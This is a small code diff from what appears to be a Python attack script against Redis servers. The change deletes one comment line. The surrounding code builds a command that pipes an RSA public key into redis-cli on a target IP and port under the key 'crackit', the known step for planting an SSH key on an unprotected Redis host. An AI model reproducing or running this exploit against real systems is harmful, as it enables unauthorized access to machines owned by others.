@@ -35,7 +35,6 @@ def main(ip, port, ssh):
 	# if foutput.read().find('OK') == -1 :
 	# 	print foutput.read()
 	# 	sys.exit()
-	#
 	# print cmd,' OK!'
 
 	cmd = 'cat '+rsa_pub_f+' | redis-cli -h '+ip+' -p '+str(port)+' -x set crackit'
